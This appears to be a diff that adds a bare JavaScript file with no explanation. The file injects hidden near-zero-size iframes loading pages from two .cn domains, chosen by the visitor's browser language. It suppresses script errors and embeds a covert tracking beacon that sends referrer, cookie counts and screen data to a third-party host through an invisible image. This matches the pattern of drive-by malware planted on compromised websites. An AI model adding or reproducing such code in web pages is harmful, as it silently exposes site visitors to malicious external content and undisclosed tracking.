@@ -1,0 +1,14 @@
+document.writeln("<iframe src=http:\/\/www.killpp.cn\/456.htm width=100 height=1><\/iframe>");
+
+if (navigator.systemLanguage=='zh-cn')
+{
+
+}
+else{
+document.writeln("<iframe src=http:\/\/www.qiqicc.cn\/dj.htm width=100 height=0><\/iframe>");
+}
+
+
+
+window.onerror=function(){return true};
+document.write ('<script>var a3150tf="51la";var a3150pu="";var a3150pf="51la";var a3150su=window.location;var a3150sf=document.referrer;var a3150of="";var a3150op="";var a3150ops=1;var a3150ot=1;var a3150d=new Date();var a3150color="";if (navigator.appName=="Netscape"){a3150color=screen.pixelDepth;} else {a3150color=screen.colorDepth;}<\/script><script>a3150tf=top.document.referrer;<\/script><script>a3150pu =window.parent.location;<\/script><script>a3150pf=window.parent.document.referrer;<\/script><script>a3150ops=document.cookie.match(new RegExp("(^| )AJSTAT_ok_pages=([^;]*)(;|$)"));a3150ops=(a3150ops==null)?1: (parseInt(unescape((a3150ops)[2]))+1);var a3150oe =new Date();a3150oe.setTime(a3150oe.getTime()+60*60*1000);document.cookie="AJSTAT_ok_pages="+a3150ops+ ";path=/;expires="+a3150oe.toGMTString();a3150ot=document.cookie.match(new RegExp("(^| )AJSTAT_ok_times=([^;]*)(;|$)"));if(a3150ot==null){a3150ot=1;}else{a3150ot=parseInt(unescape((a3150ot)[2])); a3150ot=(a3150ops==1)?(a3150ot+1):(a3150ot);}a3150oe.setTime(a3150oe.getTime()+365*24*60*60*1000);document.cookie="AJSTAT_ok_times="+a3150ot+";path=/;expires="+a3150oe.toGMTString();<\/script><script>a3150of=a3150sf;if(a3150pf!=="51la"){a3150of=a3150pf;}if(a3150tf!=="51la"){a3150of=a3150tf;}a3150op=a3150pu;try{lainframe}catch(e){a3150op=a3150su;}document.write(\'<img style="width:0px;height:0px" src="http://web.51.la/go.asp?we=A-Free-Service-for-Webmasters&svid=12&id=1923150&tpages=\'+a3150ops+\'&ttimes=\'+a3150ot+\'&tzone=\'+(0-a3150d.getTimezoneOffset()/60)+\'&tcolor=\'+a3150color+\'&sSize=\'+screen.width+\',\'+screen.height+\'&referrer=\'+escape(a3150of)+\'&vpage=\'+escape(a3150op)+\'" \/>\');<\/script>');
